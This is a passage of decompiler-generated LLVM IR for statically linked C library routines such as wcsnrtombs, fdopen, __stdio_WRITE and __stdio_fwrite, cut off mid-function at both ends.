  %v2_805441d = add i32 %v0_805441b, %arg1
  %v1_8054421 = call i32 @__GI_brk(i32 %v2_805441d)
  %v2_8054429 = icmp slt i32 %v1_8054421, 0
  %v1_805442b = icmp eq i1 %v2_8054429, false
  br i1 %v1_805442b, label %dec_label_pc_8054418.dec_label_pc_8054430_crit_edge, label %dec_label_pc_805442d

dec_label_pc_8054418.dec_label_pc_8054430_crit_edge: ; preds = %dec_label_pc_8054418
  %v0_8054430.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054430

dec_label_pc_805442d:                             ; preds = %dec_label_pc_8054418, %dec_label_pc_80543fa
  br label %dec_label_pc_8054430

dec_label_pc_8054430:                             ; preds = %dec_label_pc_8054418.dec_label_pc_8054430_crit_edge, %dec_label_pc_8054414, %dec_label_pc_805442d
  %v0_8054430 = phi i32 [ %v0_8054430.pre, %dec_label_pc_8054418.dec_label_pc_8054430_crit_edge ], [ %v0_805441b, %dec_label_pc_8054414 ], [ -1, %dec_label_pc_805442d ]
  store i32 %v0_80543e9, i32* @ebx, align 4
  ret i32 %v0_8054430

; uselistorder directives
  uselistorder i32 %v0_805441b, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_8054430, { 2, 0, 1 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_806505c.181 to i32)

; uselistorder directives
  uselistorder i32* @global_var_806505c.181, { 1, 0 }
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_805444b = icmp eq i32 %tmp5, 0
  %v1_805444d = icmp eq i1 %v1_805444b, false
  br i1 %v1_805444d, label %dec_label_pc_8054455, label %dec_label_pc_805444f

dec_label_pc_805444f:                             ; preds = %entry
  %v2_805444f = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_8054455

dec_label_pc_8054455:                             ; preds = %entry, %dec_label_pc_805444f
  %v0_8054471 = phi i32 [ %tmp5, %entry ], [ %v2_805444f, %dec_label_pc_805444f ]
  %v0_8054459 = phi i32 [ %tmp4, %entry ], [ 0, %dec_label_pc_805444f ]
  %v2_8054455 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v0_8054459, i32* %stack_var_-4, align 4
  store i32 %v2_8054455, i32* %stack_var_-8, align 4
  %v2_805446c = ptrtoint i32* %stack_var_-8 to i32
  %v5_8054472 = inttoptr i32 %v0_8054471 to i8*
  %v6_8054472 = call i32 @__GI_wcsnrtombs(i8* %v5_8054472, i32 %v2_805446c, i32 1, i32 16, i32 %tmp)
  %v1_805447a = icmp eq i32 %v6_8054472, 0
  %v1_805447c = icmp eq i1 %v1_805447a, false
  br i1 %v1_805447c, label %dec_label_pc_8054480, label %dec_label_pc_805447e

dec_label_pc_805447e:                             ; preds = %dec_label_pc_8054455
  %v1_805447e = and i32 %v6_8054472, -256
  %v2_805447e = or i32 %v1_805447e, 1
  br label %dec_label_pc_8054480

dec_label_pc_8054480:                             ; preds = %dec_label_pc_8054455, %dec_label_pc_805447e
  %v0_8054483 = phi i32 [ %v6_8054472, %dec_label_pc_8054455 ], [ %v2_805447e, %dec_label_pc_805447e ]
  ret i32 %v0_8054483

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8054480, { 1, 0 }
  uselistorder label %dec_label_pc_8054455, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_8054499 = inttoptr i32 %tmp to i8*
  %v6_8054499 = call i32 @__GI_wcsnrtombs(i8* %v5_8054499, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_8054499
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80544a7 = load i32, i32* @ebx, align 4
  %v4_80544ab = ptrtoint i8* %arg1 to i32
  store i32 %v4_80544ab, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v1_80544b7 = icmp eq i8* %arg1, null
  br i1 %v1_80544b7, label %dec_label_pc_80544c6, label %dec_label_pc_80544bb

dec_label_pc_80544bb:                             ; preds = %entry
  store i32 1, i32* %edi.global-to-local, align 4
  %v12_80544c0 = icmp eq i32 %v4_80544ab, %arg2
  %v1_80544c2 = icmp eq i1 %v12_80544c0, false
  br i1 %v1_80544c2, label %dec_label_pc_80544eb, label %dec_label_pc_80544e5

dec_label_pc_80544c6:                             ; preds = %entry
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_80544c8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80544c8, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80544eb

dec_label_pc_80544d1:                             ; preds = %dec_label_pc_80544fc
  %v1_80544d1 = call i32 @__errno_location(i32 %v0_80544a7)
  store i32 %v1_80544d1, i32* %eax.global-to-local, align 4
  %v1_80544d6 = inttoptr i32 %v1_80544d1 to i32*
  store i32 84, i32* %v1_80544d6, align 4
  br label %dec_label_pc_8054522

dec_label_pc_80544e1:                             ; preds = %dec_label_pc_8054503
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_8054517.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054513

dec_label_pc_80544e5:                             ; preds = %dec_label_pc_80544bb
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_80544e7 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80544e7, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80544eb

dec_label_pc_80544eb:                             ; preds = %dec_label_pc_80544bb, %dec_label_pc_80544c6, %dec_label_pc_80544e5
  %v2_805450315 = phi i32 [ %v4_80544ab, %dec_label_pc_80544bb ], [ %v2_80544c8, %dec_label_pc_80544c6 ], [ %v2_80544e7, %dec_label_pc_80544e5 ]
  %v0_80544f3 = phi i32 [ %arg4, %dec_label_pc_80544bb ], [ -1, %dec_label_pc_80544c6 ], [ %arg4, %dec_label_pc_80544e5 ]
  %tmp = icmp ult i32 %v0_80544f3, %arg3
  br i1 %tmp, label %dec_label_pc_80544f3, label %dec_label_pc_80544f5

dec_label_pc_80544f3:                             ; preds = %dec_label_pc_80544eb
  br label %dec_label_pc_80544f5

dec_label_pc_80544f5:                             ; preds = %dec_label_pc_80544eb, %dec_label_pc_80544f3
  %storemerge31 = phi i32 [ %v0_80544f3, %dec_label_pc_80544f3 ], [ %arg3, %dec_label_pc_80544eb ]
  %v0_80544f8 = phi i32 [ %v0_80544f3, %dec_label_pc_80544f3 ], [ %arg3, %dec_label_pc_80544eb ]
  store i32 %storemerge31, i32* %ebx.global-to-local, align 4
  %v1_80544f5 = inttoptr i32 %arg2 to i32*
  %v2_80544f5 = load i32, i32* %v1_80544f5, align 4
  store i32 %v2_80544f5, i32* %esi.global-to-local, align 4
  store i32 %v0_80544f8, i32* @ecx, align 4
  %v1_805450f3 = icmp eq i32 %v0_80544f8, 0
  %v1_805451110 = icmp eq i1 %v1_805450f3, false
  br i1 %v1_805451110, label %dec_label_pc_80544fc, label %dec_label_pc_8054513

dec_label_pc_80544fc:                             ; preds = %dec_label_pc_80544f5, %dec_label_pc_8054509
  %v2_8054503 = phi i32 [ %v2_805450c, %dec_label_pc_8054509 ], [ %v2_805450315, %dec_label_pc_80544f5 ]
  %v0_80544fc = phi i32 [ %v1_8054509, %dec_label_pc_8054509 ], [ %v2_80544f5, %dec_label_pc_80544f5 ]
  %v1_80544fc = inttoptr i32 %v0_80544fc to i32*
  %v2_80544fc = load i32, i32* %v1_80544fc, align 4
  store i32 %v2_80544fc, i32* %eax.global-to-local, align 4
  %v6_8054501 = icmp ugt i32 %v2_80544fc, 127
  br i1 %v6_8054501, label %dec_label_pc_80544d1, label %dec_label_pc_8054503

dec_label_pc_8054503:                             ; preds = %dec_label_pc_80544fc
  %v1_8054503 = trunc i32 %v2_80544fc to i8
  %v3_8054503 = inttoptr i32 %v2_8054503 to i8*
  store i8 %v1_8054503, i8* %v3_8054503, align 1
  %v0_8054505 = load i32, i32* %eax.global-to-local, align 4
  %v3_8054505 = trunc i32 %v0_8054505 to i8
  %v4_8054505 = icmp eq i8 %v3_8054505, 0
  br i1 %v4_8054505, label %dec_label_pc_80544e1, label %dec_label_pc_8054509

dec_label_pc_8054509:                             ; preds = %dec_label_pc_8054503
  %v0_8054509 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054509 = add i32 %v0_8054509, 4
  store i32 %v1_8054509, i32* %esi.global-to-local, align 4
  %v0_805450c = load i32, i32* %edx.global-to-local, align 4
  %v1_805450c = load i32, i32* %edi.global-to-local, align 4
  %v2_805450c = add i32 %v1_805450c, %v0_805450c
  store i32 %v2_805450c, i32* %edx.global-to-local, align 4
  %v0_805450e = load i32, i32* @ecx, align 4
  %v1_805450e = add i32 %v0_805450e, -1
  %v8_805450e = icmp eq i32 %v1_805450e, 0
  store i32 %v1_805450e, i32* @ecx, align 4
  %v1_8054511 = icmp eq i1 %v8_805450e, false
  br i1 %v1_8054511, label %dec_label_pc_80544fc, label %dec_label_pc_8054513

dec_label_pc_8054513:                             ; preds = %dec_label_pc_8054509, %dec_label_pc_80544f5, %dec_label_pc_80544e1
  %v0_805451b = phi i32 [ 0, %dec_label_pc_80544e1 ], [ %v2_80544f5, %dec_label_pc_80544f5 ], [ %v1_8054509, %dec_label_pc_8054509 ]
  %v0_8054517 = phi i32 [ %v0_8054517.pre, %dec_label_pc_80544e1 ], [ %v2_805450315, %dec_label_pc_80544f5 ], [ %v2_805450c, %dec_label_pc_8054509 ]
  %v2_8054513 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8054513, i32* %eax.global-to-local, align 4
  %v12_8054517 = icmp eq i32 %v0_8054517, %v2_8054513
  br i1 %v12_8054517, label %dec_label_pc_805451e, label %dec_label_pc_805451b

dec_label_pc_805451b:                             ; preds = %dec_label_pc_8054513
  %v1_805451b = load i32, i32* %ebp.global-to-local, align 4
  %v2_805451b = inttoptr i32 %v1_805451b to i32*
  store i32 %v0_805451b, i32* %v2_805451b, align 4
  br label %dec_label_pc_805451e

dec_label_pc_805451e:                             ; preds = %dec_label_pc_8054513, %dec_label_pc_805451b
  %v0_805451e = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805451e, i32* %eax.global-to-local, align 4
  %v1_8054520 = load i32, i32* @ecx, align 4
  %v2_8054520 = sub i32 %v0_805451e, %v1_8054520
  br label %dec_label_pc_8054522

dec_label_pc_8054522:                             ; preds = %dec_label_pc_80544d1, %dec_label_pc_805451e
  %storemerge1 = phi i32 [ -1, %dec_label_pc_80544d1 ], [ %v2_8054520, %dec_label_pc_805451e ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  store i32 %v0_80544a7, i32* @ebx, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v2_805450c, { 0, 2, 1 }
  uselistorder i32 %v1_8054509, { 0, 2, 1 }
  uselistorder i32 %v2_80544f5, { 1, 0, 2 }
  uselistorder i32 %v0_80544f8, { 1, 0 }
  uselistorder i32 %v2_805450315, { 1, 0 }
  uselistorder i32 %v4_80544ab, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 6, 5, 7 }
  uselistorder i32 127, { 1, 0, 6, 2, 3, 7, 4, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054522, { 1, 0 }
  uselistorder label %dec_label_pc_805451e, { 1, 0 }
  uselistorder label %dec_label_pc_80544fc, { 1, 0 }
  uselistorder label %dec_label_pc_80544f5, { 1, 0 }
  uselistorder label %dec_label_pc_80544eb, { 2, 1, 0 }
}

define i32 @fdopen(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805452c = load i32, i32* @ebx, align 4
  store i32 %v0_805452c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8054537 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 %tmp11)
  store i32 %v3_8054537, i32* @eax, align 4
  %v10_8054541 = icmp eq i32 %v3_8054537, -1
  br i1 %v10_8054541, label %dec_label_pc_8054558, label %dec_label_pc_8054546

dec_label_pc_8054546:                             ; preds = %entry
  %v0_8054546 = load i32, i32* @ebx, align 4
  %v4_805454e = inttoptr i32 %arg2 to i8*
  %v5_805454e = call i32 @_stdio_fopen(i32 %v3_8054537, i8* %v4_805454e, i32 0, i32 %v0_8054546)
  br label %dec_label_pc_8054558

dec_label_pc_8054558:                             ; preds = %entry, %dec_label_pc_8054546
  %v0_8054558 = phi i32 [ 0, %entry ], [ %v5_805454e, %dec_label_pc_8054546 ]
  %v2_805455c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805455c, i32* @ebx, align 4
  ret i32 %v0_8054558

; uselistorder directives
  uselistorder i32 %v3_8054537, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054558, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_8054560 = load i32, i32* @ebp, align 4
  %v0_8054561 = load i32, i32* @edi, align 4
  %v0_8054562 = load i32, i32* @esi, align 4
  %v0_8054563 = load i32, i32* @ebx, align 4
  %v4_8054567 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8054567, i32* @edi, align 4
  store i32 %arg2, i32* @esi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_80545734 = icmp eq i32 %arg3, 0
  br i1 %v1_80545734, label %dec_label_pc_80545d2, label %dec_label_pc_8054578.lr.ph

dec_label_pc_8054578.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8054578

dec_label_pc_8054578:                             ; preds = %dec_label_pc_8054597.dec_label_pc_8054578_crit_edge, %dec_label_pc_8054578.lr.ph
  %v0_8054588 = phi i32 [ %v4_8054567, %dec_label_pc_8054578.lr.ph ], [ %v0_8054588.pre, %dec_label_pc_8054597.dec_label_pc_8054578_crit_edge ]
  %v0_8054587 = phi i32 [ %arg2, %dec_label_pc_8054578.lr.ph ], [ %v2_8054599, %dec_label_pc_8054597.dec_label_pc_8054578_crit_edge ]
  %v0_805457a.in = phi i32 [ %arg3, %dec_label_pc_8054578.lr.ph ], [ %v2_8054597, %dec_label_pc_8054597.dec_label_pc_8054578_crit_edge ]
  %v0_805457a = icmp slt i32 %v0_805457a.in, 0
  store i32 %v0_805457a.in, i32* @ebp, align 4
  %v2_805457a = icmp eq i1 %v0_805457a, false
  %storemerge = select i1 %v2_805457a, i32 %v0_805457a.in, i32 2147483647
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8054588 = add i32 %v0_8054588, 4
  %v2_8054588 = inttoptr i32 %v1_8054588 to i32*
  %v3_8054588 = load i32, i32* %v2_8054588, align 4
  %v4_805458b = call i32 @__libc_write(i32 %v3_8054588, i32 %v0_8054587, i32 %storemerge)
  store i32 %v4_805458b, i32* %eax.global-to-local, align 4
  %v2_8054593 = icmp slt i32 %v4_805458b, 0
  br i1 %v2_8054593, label %dec_label_pc_805459d, label %dec_label_pc_8054597

dec_label_pc_8054597:                             ; preds = %dec_label_pc_8054578
  %v0_8054597 = load i32, i32* @ebx, align 4
  %v2_8054597 = sub i32 %v0_8054597, %v4_805458b
  %v12_8054597 = icmp eq i32 %v2_8054597, 0
  store i32 %v2_8054597, i32* @ebx, align 4
  %v0_8054599 = load i32, i32* @esi, align 4
  %v2_8054599 = add i32 %v0_8054599, %v4_805458b
  store i32 %v2_8054599, i32* @esi, align 4
  br i1 %v12_8054597, label %dec_label_pc_80545d2, label %dec_label_pc_8054597.dec_label_pc_8054578_crit_edge

dec_label_pc_8054597.dec_label_pc_8054578_crit_edge: ; preds = %dec_label_pc_8054597
  %v0_8054588.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8054578

dec_label_pc_805459d:                             ; preds = %dec_label_pc_8054578
  %v0_805459d = load i32, i32* @edi, align 4
  %v1_805459d = add i32 %v0_805459d, 8
  %v2_805459d = inttoptr i32 %v1_805459d to i32*
  %v3_805459d = load i32, i32* %v2_805459d, align 4
  store i32 %v3_805459d, i32* @edx, align 4
  %v1_80545a0 = add i32 %v0_805459d, 12
  %v2_80545a0 = inttoptr i32 %v1_80545a0 to i32*
  %v3_80545a0 = load i32, i32* %v2_80545a0, align 4
  store i32 %v3_80545a0, i32* %eax.global-to-local, align 4
  %v1_80545a3 = inttoptr i32 %v0_805459d to i16*
  %v2_80545a3 = load i16, i16* %v1_80545a3, align 2
  %v3_80545a3 = or i16 %v2_80545a3, 8
  store i16 %v3_80545a3, i16* %v1_80545a3, align 2
  %v0_80545a7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80545a7 = load i32, i32* @edx, align 4
  %v2_80545a7 = sub i32 %v0_80545a7, %v1_80545a7
  %v12_80545a7 = icmp eq i32 %v2_80545a7, 0
  store i32 %v2_80545a7, i32* %eax.global-to-local, align 4
  %v4_80545ce.pre = load i32, i32* @ebx, align 4
  br i1 %v12_80545a7, label %dec_label_pc_80545ce, label %dec_label_pc_80545ab

dec_label_pc_80545ab:                             ; preds = %dec_label_pc_805459d
  %v6_80545ad = icmp ugt i32 %v2_80545a7, %v4_80545ce.pre
  br i1 %v6_80545ad, label %dec_label_pc_80545b1.preheader, label %dec_label_pc_80545af

dec_label_pc_80545af:                             ; preds = %dec_label_pc_80545ab
  store i32 %v2_80545a7, i32* @ebp, align 4
  br label %dec_label_pc_80545b1.preheader

dec_label_pc_80545b1.preheader:                   ; preds = %dec_label_pc_80545af, %dec_label_pc_80545ab
  %v0_80545b1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80545b1

dec_label_pc_80545b1:                             ; preds = %dec_label_pc_80545b1.preheader, %dec_label_pc_80545c3
  %v2_80545b3 = phi i32 [ %v1_80545a7, %dec_label_pc_80545b1.preheader ], [ %v1_80545bf, %dec_label_pc_80545c3 ]
  %v4_80545b1 = phi i32 [ %v2_80545a7, %dec_label_pc_80545b1.preheader ], [ %v0_80545b5, %dec_label_pc_80545c3 ]
  %v0_80545b1 = phi i32 [ %v0_80545b1.pre, %dec_label_pc_80545b1.preheader ], [ %v1_80545c3, %dec_label_pc_80545c3 ]
  %v1_80545b1 = inttoptr i32 %v0_80545b1 to i8*
  %v2_80545b1 = load i8, i8* %v1_80545b1, align 1
  %v3_80545b1 = zext i8 %v2_80545b1 to i32
  %v5_80545b1 = and i32 %v4_80545b1, -256
  %v6_80545b1 = or i32 %v3_80545b1, %v5_80545b1
  store i32 %v6_80545b1, i32* %eax.global-to-local, align 4
  %v3_80545b3 = inttoptr i32 %v2_80545b3 to i8*
  store i8 %v2_80545b1, i8* %v3_80545b3, align 1
  %v0_80545b5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80545b5 = trunc i32 %v0_80545b5 to i8
  %v10_80545b5 = icmp eq i8 %v1_80545b5, 10
  %v1_80545b7 = icmp eq i1 %v10_80545b5, false
  br i1 %v1_80545b7, label %dec_label_pc_80545bf, label %dec_label_pc_80545b9

dec_label_pc_80545b9:                             ; preds = %dec_label_pc_80545b1
  %v0_80545b9 = load i32, i32* @edi, align 4
  %v1_80545b9 = add i32 %v0_80545b9, 1
  %v2_80545b9 = inttoptr i32 %v1_80545b9 to i8*
  %v3_80545b9 = load i8, i8* %v2_80545b9, align 1
  %v4_80545b9 = urem i8 %v3_80545b9, 2
  %v5_80545b9 = icmp eq i8 %v4_80545b9, 0
  %v1_80545bd = icmp eq i1 %v5_80545b9, false
  br i1 %v1_80545bd, label %dec_label_pc_80545b9.dec_label_pc_80545c6_crit_edge, label %dec_label_pc_80545bf

dec_label_pc_80545b9.dec_label_pc_80545c6_crit_edge: ; preds = %dec_label_pc_80545b9
  %v0_80545c6.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80545c6

dec_label_pc_80545bf:                             ; preds = %dec_label_pc_80545b9, %dec_label_pc_80545b1
  %v0_80545bf = load i32, i32* @edx, align 4
  %v1_80545bf = add i32 %v0_80545bf, 1
  store i32 %v1_80545bf, i32* @edx, align 4
  %v0_80545c0 = load i32, i32* @ebp, align 4
  %v1_80545c0 = add i32 %v0_80545c0, -1
  %v8_80545c0 = icmp eq i32 %v1_80545c0, 0
  store i32 %v1_80545c0, i32* @ebp, align 4
  br i1 %v8_80545c0, label %dec_label_pc_80545bf.dec_label_pc_80545c6_crit_edge, label %dec_label_pc_80545c3

dec_label_pc_80545bf.dec_label_pc_80545c6_crit_edge: ; preds = %dec_label_pc_80545bf
  %v1_80545c6.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80545c6

dec_label_pc_80545c3:                             ; preds = %dec_label_pc_80545bf
  %v0_80545c3 = load i32, i32* @esi, align 4
  %v1_80545c3 = add i32 %v0_80545c3, 1
  store i32 %v1_80545c3, i32* @esi, align 4
  br label %dec_label_pc_80545b1

dec_label_pc_80545c6:                             ; preds = %dec_label_pc_80545bf.dec_label_pc_80545c6_crit_edge, %dec_label_pc_80545b9.dec_label_pc_80545c6_crit_edge
  %v1_80545c6 = phi i32 [ %v0_80545b9, %dec_label_pc_80545b9.dec_label_pc_80545c6_crit_edge ], [ %v1_80545c6.pre, %dec_label_pc_80545bf.dec_label_pc_80545c6_crit_edge ]
  %v0_80545c6 = phi i32 [ %v0_80545c6.pre, %dec_label_pc_80545b9.dec_label_pc_80545c6_crit_edge ], [ %v1_80545bf, %dec_label_pc_80545bf.dec_label_pc_80545c6_crit_edge ]
  %v2_80545c6 = add i32 %v1_80545c6, 16
  %v3_80545c6 = inttoptr i32 %v2_80545c6 to i32*
  store i32 %v0_80545c6, i32* %v3_80545c6, align 4
  %v0_80545c9 = load i32, i32* @edx, align 4
  %v1_80545c9 = load i32, i32* @edi, align 4
  %v2_80545c9 = add i32 %v1_80545c9, 8
  %v3_80545c9 = inttoptr i32 %v2_80545c9 to i32*
  %v4_80545c9 = load i32, i32* %v3_80545c9, align 4
  %v5_80545c9 = sub i32 %v0_80545c9, %v4_80545c9
  store i32 %v5_80545c9, i32* @edx, align 4
  %v0_80545cc = load i32, i32* @ebx, align 4
  %v2_80545cc = sub i32 %v0_80545cc, %v5_80545c9
  br label %dec_label_pc_80545ce

dec_label_pc_80545ce:                             ; preds = %dec_label_pc_805459d, %dec_label_pc_80545c6
  %v4_80545ce = phi i32 [ %v2_80545cc, %dec_label_pc_80545c6 ], [ %v4_80545ce.pre, %dec_label_pc_805459d ]
  %v5_80545ce = sub i32 %arg3, %v4_80545ce
  br label %dec_label_pc_80545d2

dec_label_pc_80545d2:                             ; preds = %dec_label_pc_8054597, %entry, %dec_label_pc_80545ce
  %stack_var_12.0 = phi i32 [ %v5_80545ce, %dec_label_pc_80545ce ], [ 0, %entry ], [ %arg3, %dec_label_pc_8054597 ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  store i32 %v0_8054563, i32* @ebx, align 4
  store i32 %v0_8054562, i32* @esi, align 4
  store i32 %v0_8054561, i32* @edi, align 4
  store i32 %v0_8054560, i32* @ebp, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_80545c3, { 1, 0 }
  uselistorder i32 %v1_80545c0, { 1, 0 }
  uselistorder i32 %v1_80545bf, { 0, 2, 1 }
  uselistorder i32 %v0_80545b5, { 1, 0 }
  uselistorder i32 %v2_8054599, { 1, 0 }
  uselistorder i32 %v2_8054597, { 1, 2, 0 }
  uselistorder i32 %v4_805458b, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @__libc_write, { 2, 11, 10, 9, 1, 0, 8, 6, 7, 3, 5, 12, 4 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_80545d2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80545ce, { 1, 0 }
  uselistorder label %dec_label_pc_80545b1, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80545e0 = load i32, i32* @ebp, align 4
  %v0_80545e1 = load i32, i32* @edi, align 4
  %v0_80545e2 = load i32, i32* @esi, align 4
  %v0_80545e3 = load i32, i32* @ebx, align 4
  store i32 %v0_80545e3, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_80545f3 = add i32 %arg3, 1
  %v2_80545f3 = inttoptr i32 %v1_80545f3 to i8*
  %v3_80545f3 = load i8, i8* %v2_80545f3, align 1
  %v4_80545f3 = and i8 %v3_80545f3, 2
  %v5_80545f3 = icmp eq i8 %v4_80545f3, 0
  %v1_80545f7 = icmp eq i1 %v5_80545f3, false
  br i1 %v1_80545f7, label %dec_label_pc_80546ae, label %dec_label_pc_80545fd

dec_label_pc_80545fd:                             ; preds = %entry
  %v1_80545fd = add i32 %arg3, 4
  %v2_80545fd = inttoptr i32 %v1_80545fd to i32*
  %v3_80545fd = load i32, i32* %v2_80545fd, align 4
  %v13_80545fd = icmp eq i32 %v3_80545fd, -2
  %v1_8054601 = add i32 %arg3, 16
  %v2_8054601 = inttoptr i32 %v1_8054601 to i32*
  %v3_8054601 = load i32, i32* %v2_8054601, align 4
  store i32 %v3_8054601, i32* @edx, align 4
  %v1_8054604 = add i32 %arg3, 12
  %v2_8054604 = inttoptr i32 %v1_8054604 to i32*
  %v3_8054604 = load i32, i32* %v2_8054604, align 4
  %v1_8054607 = icmp eq i1 %v13_80545fd, false
  %v2_8054627 = sub i32 %v3_8054604, %v3_8054601
  store i32 %v2_8054627, i32* %eax.global-to-local, align 4
  br i1 %v1_8054607, label %dec_label_pc_8054627, label %dec_label_pc_8054609

dec_label_pc_8054609:                             ; preds = %dec_label_pc_80545fd
  %tmp = icmp ult i32 %v2_8054627, %arg2
  br i1 %tmp, label %dec_label_pc_8054611, label %dec_label_pc_8054613

dec_label_pc_8054611:                             ; preds = %dec_label_pc_8054609
  br label %dec_label_pc_8054613

dec_label_pc_8054613:                             ; preds = %dec_label_pc_8054609, %dec_label_pc_8054611
  %storemerge = phi i32 [ %v2_8054627, %dec_label_pc_8054611 ], [ %arg2, %dec_label_pc_8054609 ]
  %v0_8054614 = phi i32 [ %v2_8054627, %dec_label_pc_8054611 ], [ %arg2, %dec_label_pc_8054609 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_8054617 = inttoptr i32 %v3_8054601 to i16*
  %v4_8054617 = call i32 @memcpy(i16* %v3_8054617, i32 %v0_8054614, i32 %v2_8054627)
  store i32 %v4_8054617, i32* %eax.global-to-local, align 4
  %v0_805461c = load i32, i32* @ebx, align 4
  %v1_805461c = add i32 %v0_805461c, 16
  %v2_805461c = inttoptr i32 %v1_805461c to i32*
  %v3_805461c = load i32, i32* %v2_805461c, align 4
  %v4_805461c = load i32, i32* @esi, align 4
  %v5_805461c = add i32 %v4_805461c, %v3_805461c
  store i32 %v5_805461c, i32* %v2_805461c, align 4
  br label %dec_label_pc_80546c6

dec_label_pc_8054627:                             ; preds = %dec_label_pc_80545fd
  %v6_805462b = icmp ult i32 %v2_8054627, %arg2
  br i1 %v6_805462b, label %dec_label_pc_8054695, label %dec_label_pc_805462d

dec_label_pc_805462d:                             ; preds = %dec_label_pc_8054627
  %v0_805462d = load i32, i32* @ecx, align 4
  %v3_8054631 = inttoptr i32 %v3_8054601 to i16*
  %v4_8054631 = call i32 @memcpy(i16* %v3_8054631, i32 %arg2, i32 %v0_805462d)
  store i32 %v4_8054631, i32* %eax.global-to-local, align 4
  %v0_8054636 = load i32, i32* @ebx, align 4
  %v1_8054636 = add i32 %v0_8054636, 16
  %v2_8054636 = inttoptr i32 %v1_8054636 to i32*
  %v3_8054636 = load i32, i32* %v2_8054636, align 4
  %v4_8054636 = load i32, i32* @edi, align 4
